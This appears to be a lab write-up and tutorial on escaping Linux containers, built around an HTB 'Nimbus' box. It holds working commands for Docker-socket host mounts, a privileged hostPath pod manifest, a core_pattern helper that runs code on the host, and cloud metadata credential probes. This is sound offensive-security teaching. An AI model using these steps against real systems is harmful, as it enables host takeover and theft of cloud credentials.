The Container Is Not the Boundary

A practical method for turning an isolated shell into a map of the runtime, node, cluster, and cloud authority around it.

Abdelaaziz Belkhair 14 August 2026 18 min read

The first shell on HTB Nimbus landed in a worker container. It looked promising for five minutes, then stopped being interesting: no useful effective capabilities, seccomp enabled, read-only kernel interfaces, no host filesystem, and no runtime socket.

The escape did not come from forcing a kernel trick into that shell. The worker could reach an AWS-like control plane, and that control plane could start a privileged build. The second container had the host-global interface the first one lacked. That was the route.

A container escape is usually an authority problem before it is an exploit problem.

TL;DR. Do not begin with a payload. Inventory every interface that crosses the namespace, identify which component acts on the other side, and test the shortest path to stronger authority. Ask what the workload can make the runtime, kubelet, API server, build system, or cloud account do.

Find the real boundary

The process namespace is only the innermost layer. A useful investigation follows authority outward until it reaches something that can affect the host or create a stronger execution context.

01 Process UID · caps · syscalls
→
02 Interfaces mounts · sockets · tokens
→
03 Authority runtime · kubelet · IAM
→
04 Impact node · cluster · cloud

For every promising interface, answer three questions:

Can I reach it?

A socket that exists but rejects your UID is not a primitive. A service account token without API connectivity is not a path.

Can I influence it?

Read access may disclose credentials. Write access may alter host state. Control-plane verbs may create an entirely new workload.

Who acts on the result?

The decisive actor may be host dockerd, kubelet, the kernel, a CI runner, or a cloud service, not the current process.

Vocabulary

I use escape broadly here: crossing from the current workload into a more trusted layer. That can mean host execution, node filesystem access, cluster-level control, or a cloud pivot that creates a stronger compute context.

Run a five-minute triage

The first pass should reduce the search space. Collect identity, isolation, mounts, sockets, orchestration context, and policy state before touching anything.

A compact baseline

# Identity and confinement
id
awk '/^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):/' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map 2>/dev/null
cat /proc/self/attr/current 2>/dev/null

# Runtime and namespace clues
cat /proc/1/cgroup 2>/dev/null
head -n 20 /proc/self/mountinfo
for ns in mnt pid net ipc uts user cgroup; do
  printf '%-7s self=%s init=%s\n' "$ns" \
    "$(readlink /proc/self/ns/$ns 2>/dev/null)" \
    "$(readlink /proc/1/ns/$ns 2>/dev/null)"
done

# Cross-boundary interfaces
find /run /var/run -type s 2>/dev/null | grep -Ei 'docker|containerd|crio|podman'
ls -ld /host /rootfs /node /hostfs /mnt/host 2>/dev/null
ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null
env | grep -Ei 'KUBERNETES|DOCKER|CONTAINER|CI|RUNNER|CODEBUILD|AWS|AZURE|GOOGLE|GCP'

If capsh is present, decode the effective capability mask directly:

capsh --decode="0x$(awk '/CapEff:/ {print $2}' /proc/self/status)"

Rank evidence, not excitement

Signal What it establishes Priority
Usable rootful runtime socket The workload can ask a host daemon to create containers and mounts. P0
Read-write host root The node filesystem boundary is already crossed. P0
Workload creation + weak admission The identity may create a privileged or host-mounted pod. P0
Writable host-global kernel interface A kernel callback may execute a host-visible helper. P1
CAP_SYS_ADMIN alone A broad lead; impact still depends on namespaces, mounts, seccomp, and LSM policy. P2
uid=0 alone Root in the current user namespace, not necessarily on the host. P3
An old version string A hypothesis. Vendor backports and an unreachable trigger can remove impact. P3
Stop condition

If the container has no useful capabilities, a private user namespace, enforced seccomp/LSM policy, read-only kernel filesystems, no host mount, no runtime socket, and a low-privilege service account, stop trying random host payloads. Move outward to the network and platform.

Test the shortest paths to the host

Runtime APIs and host mounts outrank clever kernel work. They are explicit control surfaces, easy to validate, and usually explain impact cleanly.

Docker: the socket is the privilege

A usable rootful Docker socket is effectively a host-control API. The Docker documentation is direct about the consequence: a client that can instruct the daemon can mount the host root into a new container.

SOCK=/var/run/docker.sock
ls -l "$SOCK"
curl -sS --unix-socket "$SOCK" http://localhost/_ping
curl -sS --unix-socket "$SOCK" http://localhost/version
curl -sS --unix-socket "$SOCK" http://localhost/containers/json

In an authorized lab, a read-only bind is enough to prove the boundary:

docker -H unix:///var/run/docker.sock run --rm \
  --mount type=bind,src=/,dst=/host,readonly \
  alpine:latest \
  sh -c 'cat /host/etc/hostname; head -n 5 /host/etc/os-release'
Pursue

Rootful daemon accepts requests

Confirm whether bind mounts, privileged containers, and image pulls are allowed. An authorization plugin may still narrow the API.

Reclassify

Rootless or remote daemon

Control may stop at a user account, a VM, or another trust boundary. It is still valuable, but it is not automatically host root.

containerd and CRI: same idea, different clients

Kubernetes nodes often expose containerd or CRI-O instead of Docker. First establish that the endpoint is reachable and learn which namespace owns the workloads.

find /run /var/run -type s 2>/dev/null | grep -Ei 'containerd|crio|cri'

ctr --address /run/containerd/containerd.sock version
ctr --address /run/containerd/containerd.sock namespaces list
ctr --address /run/containerd/containerd.sock \
  --namespace k8s.io containers list

crictl --runtime-endpoint unix:///run/containerd/containerd.sock version
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps -a

ctr is a low-level debugging client, and its flags vary across releases. crictl needs both pod-sandbox and container configuration to create a workload. Treat syntax failures as tooling feedback; the real security question is whether the endpoint accepts a privileged workload or host bind.

A host filesystem mount is already a pivot

findmnt 2>/dev/null
for root in /host /rootfs /node /hostfs /mnt/host; do
  [ -e "$root/etc/os-release" ] && printf 'host view: %s\n' "$root"
done

# Test permissions without writing
HOST=/host
namei -l "$HOST/etc/shadow" 2>/dev/null
test -r "$HOST/etc/shadow" && echo 'host shadow is readable'
test -w "$HOST/tmp" && echo 'host tmp is writable'

On a Kubernetes node, the following locations deserve immediate attention:

/etc/kubernetes/manifests        static pods watched by kubelet
/var/lib/kubelet/config.yaml     kubelet configuration
/var/lib/kubelet/kubeconfig      node credentials and API context
/var/lib/kubelet/pki             kubelet certificates
/var/lib/kubelet/pods            mounted workload data and Secrets
/var/lib/kubelet/plugins         CSI and device-plugin surfaces
Why a writable static-pod directory is critical

Kubelet watches its configured staticPodPath and creates pods from manifests placed there. A process that can write that directory can ask kubelet to start a privileged pod with a host mount, even if the process has no Kubernetes API token.

HOST=/host
grep -R 'staticPodPath\|pod-manifest-path' \
  "$HOST/var/lib/kubelet" "$HOST/etc" 2>/dev/null | head

Do not drop a manifest merely to see whether it works. On an assessment, agree on a harmless marker, a cleanup step, and the exact node before changing kubelet state.

Follow Kubernetes authority

A well-confined Linux process can still hold a service account that creates privileged workloads. In Kubernetes, API authorization and admission policy matter as much as the container's local privileges.

Establish the identity and its verbs

SA_DIR=/var/run/secrets/kubernetes.io/serviceaccount
NS=$(cat "$SA_DIR/namespace")
TOKEN=$(cat "$SA_DIR/token")
CACERT="$SA_DIR/ca.crt"
API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

curl -sS --cacert "$CACERT" \
  -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/namespaces/$NS/pods" | head

kubectl auth can-i --list -n "$NS"
kubectl auth can-i create pods -n "$NS"
kubectl auth can-i create daemonsets.apps -n "$NS"
kubectl auth can-i get secrets -n "$NS"
kubectl auth can-i create serviceaccounts/token -n "$NS"
kubectl auth can-i get nodes/proxy

Pod creation is only half the chain

The useful sequence is authorization → admission → scheduling → node access. A service account may be allowed to create pods while Pod Security Admission rejects privileged: true and hostPath.

Use server-side dry-run to test the complete policy path without creating the pod:

kubectl apply --dry-run=server -f - <<'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: boundary-policy-check
spec:
  restartPolicy: Never
  containers:
  - name: check
    image: busybox:1.36
    command: ["sh", "-c", "id"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
      readOnly: true
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
YAML
Permission Why it matters Necessary follow-up
create pods Can select service accounts and request dangerous security contexts. Test admission, quota, image policy, and scheduling.
create daemonsets Can project the same workload across many nodes. Check taints, selectors, and admission.
get/list secrets May expose application credentials and legacy service-account tokens. Determine scope and whether the credentials cross namespaces.
create serviceaccounts/token Can mint a bounded token for another service account. Identify which service accounts can be targeted.
get nodes/proxy Can reach privileged kubelet API paths through the API server. Validate the verb/path combination and kubelet authorization.
bind, escalate, impersonate Can attach, create, or assume authority beyond the current identity. Resolve the exact resources and subjects in scope.

Shared namespaces are multipliers

hostPID, hostNetwork, and hostIPC are not escapes by themselves. They make another primitive more useful.

hostPID

Exposes host processes and possibly /proc/<pid>/root. Pair it with ptrace capability or weak procfs restrictions.

hostNetwork

Exposes node-local services, kubelet listeners, metadata proxies, and the host routing table.

hostIPC

Exposes shared-memory and IPC objects. Its value depends on what host processes place there.

ps -eo pid,ppid,user,comm,args | head -n 30
readlink /proc/1/ns/pid /proc/self/ns/pid
ls -la /proc/1/root 2>/dev/null
ip addr; ip route
ss -lntup 2>/dev/null | head
ipcs -a 2>/dev/null

Evaluate kernel callbacks as chains

Classic container escapes such as core_pattern and cgroup v1 release_agent are not magic incantations. They work only when four independent conditions line up.

Interface

A host-global kernel control is visible and writable.

Authority

The process has the required capability in the relevant user namespace.

Path

The kernel can resolve an attacker-controlled helper from the host mount namespace.

Trigger

A reachable event causes the kernel to invoke that helper.

core_pattern: the Nimbus primitive

When /proc/sys/kernel/core_pattern begins with |, the kernel pipes a core dump to a userspace handler. In a privileged container, a writable host-global value plus a host-visible helper path can turn a container crash into host-context execution.

cat /proc/sys/kernel/core_pattern
test -w /proc/sys/kernel/core_pattern && echo writable

UPPERDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' \
  /proc/self/mountinfo | head -n 1)
printf 'overlay upperdir: %s\n' "$UPPERDIR"

awk '/^(CapEff|NoNewPrivs|Seccomp):/' /proc/self/status
cat /proc/self/uid_map

The overlay upperdir matters because a path such as /tmp/helper usually exists only in the container mount namespace. The kernel's piped handler must be reachable from the host view.

Lab-only proof

Changing core_pattern is host-global and crashing a process is observable. Save the original value, use a harmless marker, restore it immediately, and coordinate the test. Do not replace an existing systemd-coredump or apport handler casually.

The minimal proof sequence 
# Preconditions: authorized ephemeral host, writable core_pattern,
# a non-empty host-visible UPPERDIR, and a core-dumping trigger.
test -n "$UPPERDIR" || exit 1
ORIGINAL=$(cat /proc/sys/kernel/core_pattern)

cat > /tmp/core-helper.sh <<SH
#!/bin/sh
/usr/bin/id > "$UPPERDIR/core-pattern.proof"
/usr/bin/date >> "$UPPERDIR/core-pattern.proof"
SH

install -m 0755 /tmp/core-helper.sh "$UPPERDIR/core-helper.sh"
printf '|%s\n' "$UPPERDIR/core-helper.sh" > /proc/sys/kernel/core_pattern
(sh -c 'kill -SEGV $$') || true
printf '%s\n' "$ORIGINAL" > /proc/sys/kernel/core_pattern

Verify the marker from the host or through an approved host mount, then remove both helper and marker.

cgroup v1 release_agent: now a narrow, legacy path

The kernel can run a configured helper when the last task leaves a cgroup with notify_on_release=1. Modern investigations should reject this path quickly unless all of the legacy conditions are present.

stat -fc %T /sys/fs/cgroup
mount | grep 'type cgroup '
find /sys/fs/cgroup \
  \( -name release_agent -o -name notify_on_release \) 2>/dev/null
cat /proc/self/uid_map
awk '/^(CapEff|NoNewPrivs|Seccomp):/' /proc/self/status
Required

Every gate is open

cgroup v1, writable hierarchy, writable root release_agent, initial-user-namespace CAP_SYS_ADMIN, a host-visible helper, and an empty-cgroup trigger.

Stop

Any modern guard holds

cgroup v2 only, user-namespace remapping, read-only cgroupfs, missing init-user-namespace authority, LSM denial, or no host-visible path.

The rest of the usermode-helper family

modprobe_path, uevent_helper, and binfmt_misc belong to the same model. Do not collect them as tricks; test the actor and trigger.

Interface Required trigger Common reason to stop
/proc/sys/kernel/modprobe A reachable kernel module auto-load event. Read-only sysctl, auto-loading constrained, or no host-visible helper.
/sys/kernel/uevent_helper A useful uevent that invokes the configured helper. Read-only sysfs or modern distro behavior makes the path impractical.
binfmt_misc A host execution context consumes the registered format. Registration exists only in a private mount namespace. 
for path in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /sys/kernel/uevent_helper \
  /proc/sys/fs/binfmt_misc/status; do
  printf '\n### %s\n' "$path"
  ls -l "$path" 2>/dev/null
  cat "$path" 2>/dev/null
done

Read the guardrails before changing the payload

A failed primitive often means policy is working. Classify the denial before assuming the exploit is wrong.

User namespaces change what “root” means

cat /proc/self/uid_map
cat /proc/self/gid_map
readlink /proc/self/ns/user /proc/1/ns/user
No remapping 
0          0 4294967295

Container UID 0 maps to host UID 0 across the full range.

Remapped / rootless shape 
0     100000      65536

Container UID 0 maps to an unprivileged high-numbered host UID.

A capability is evaluated in a user namespace. CAP_SYS_ADMIN inside a child user namespace does not grant the same authority over host-global resources. This explains many “I am root and the bit is set, but the write still fails” situations.

Capabilities need an interface

Capability Becomes important when paired with
CAP_SYS_ADMIN Writable cgroupfs, mount operations, namespace entry, or writable host-global sysctls.
CAP_SYS_MODULE Host kernel module loading remains reachable and module policy permits it.
CAP_SYS_PTRACE Host PID visibility and permissive procfs/LSM settings.
CAP_DAC_READ_SEARCH A host filesystem view containing otherwise unreadable files.
CAP_MKNOD A weak device cgroup and access to a meaningful host device.
CAP_NET_ADMIN The host network namespace or a valuable shared network path.

Translate errors into gates

EPERM from mount                capability, seccomp, LSM, or user namespace
permission denied on /proc/sys  read-only mount, capability, LSM, or user namespace
device node opens with EPERM    device cgroup or LSM
setns fails                     missing authority in the target namespace
exec is denied                  AppArmor or SELinux policy
socket connect is denied        Unix permissions, LSM, or an API authorization layer
awk '/^(NoNewPrivs|Seccomp):/' /proc/self/status
cat /proc/self/attr/current 2>/dev/null
cat /proc/self/attr/apparmor/current 2>/dev/null
cat /sys/kernel/security/lsm 2>/dev/null
getenforce 2>/dev/null
id -Z 2>/dev/null
Interpretation

Seccomp: 2 means a filter is active, not that every interesting syscall is blocked. docker-default, container_t, and spc_t are policy clues, not verdicts. Test the exact operation and keep the error.

Leave the container layer when the platform is stronger

CI jobs, cloud identities, metadata services, registries, and deployment systems often hold more authority than the workload that can reach them. Nimbus was this kind of escape.

The Nimbus chain

Worker

The local shell is confined

No useful effective capabilities, no host mount, read-only kernel interfaces, and seccomp enabled.

Control plane

The worker can create a build

Its platform credentials do not grant host root. They grant the ability to request a different execution context.

Builder

The new container is privileged

The build configuration exposes host-global kernel state and a host-visible overlay path.

Host

core_pattern crosses the final boundary

A controlled crash invokes the helper from the host view. The route is worker → platform → builder → kernel → host.

Profile a build environment

env | grep -Ei 'CI|RUNNER|CODEBUILD|DOCKER|REGISTRY|KUBE|AWS|AZURE|GOOGLE|GCP'
docker version 2>/dev/null
ls -l /var/run/docker.sock /certs/client 2>/dev/null
aws sts get-caller-identity 2>/dev/null
gcloud auth list 2>/dev/null
az account show 2>/dev/null
kubectl auth can-i '*' '*' 2>/dev/null

The high-value questions are about what the identity can create or modify:

  • Can it start a privileged build, VM, task, or pod?
  • Can it pass or assume a stronger role?
  • Can it push an image consumed by production?
  • Can it modify a deployment manifest, release artifact, or infrastructure state?
  • Can it read a kubeconfig, secret store, or deployment credential?

Metadata is a credential boundary, not a container escape

Metadata access becomes interesting only when the returned identity can cross another boundary. Begin by establishing reachability and identity; do not dump credentials into terminal history or assessment logs.

Metadata reachability probes 
# AWS IMDSv2
IMDS_TOKEN=$(curl -sS --max-time 2 -X PUT \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' \
  http://169.254.169.254/latest/api/token)
curl -sS --max-time 2 \
  -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
curl -sS --max-time 2 -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Azure
curl -sS --max-time 2 -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'

Use runtime CVEs last

A version string is not an exploit path. Confirm the actual runtime, vendor backports, attacker control over the required object, and a reachable create/exec trigger.

Example Mechanism What must be reachable
CVE-2019-5736 A malicious container process abuses a /proc/<pid>/exe handle to overwrite the host runc binary. An affected runtime plus attacker control of a container and a subsequent run or exec invocation.
CVE-2024-21626 An internal file descriptor leaks a reference outside the container root and can expose or overwrite host paths. An affected runtime plus control of image WORKDIR, process cwd, bind source, or an exec target, depending on the attack. 
runc --version 2>/dev/null
docker version 2>/dev/null
containerd --version 2>/dev/null
crictl version 2>/dev/null
uname -a
cat /etc/os-release

Then verify the installed package changelog or vendor advisory. Distribution backports routinely invalidate naive version comparisons.

Use this order under pressure

The fastest workflow prioritizes delegated authority and direct host access, then falls back to local kernel and runtime research.

01

Control planes

Runtime sockets, Kubernetes tokens, CI credentials, cloud roles, and deployment APIs.

02

Host views

Read-write host mounts, kubelet state, static-pod paths, and host procfs.

03

Local authority

Effective capabilities, shared namespaces, devices, writable cgroups, and kernel sysctls.

04

Guardrails

User namespaces, seccomp, AppArmor, SELinux, read-only mounts, and API admission.

05

Specific vulnerabilities

Only after a reachable runtime and trigger have been identified.

A one-screen decision table

If you find Ask next Likely path
Docker/containerd/CRI socket Can my UID connect, and can the daemon create host binds? Runtime → host
Host filesystem Is it writable; does it include kubelet or runtime state? Filesystem → node
Kubernetes service account Can it create workloads, and will admission accept the dangerous fields? API → pod → node
CAP_SYS_ADMIN In which user namespace, against which writable interface? Capability + interface
Writable core_pattern Is there a host-visible helper and a valid core trigger? Kernel callback → host
cgroup v1 release_agent Do I have initial-user-namespace authority and a writable hierarchy? Legacy callback → host
CI or cloud identity Can it create stronger compute or modify a consumed artifact? Platform → new context
Old runtime version Is the actual package affected, and can I reach the required trigger? Runtime CVE, if proven

The useful question is not “how do I break this container?” It is “which trusted component accepts input from it?”
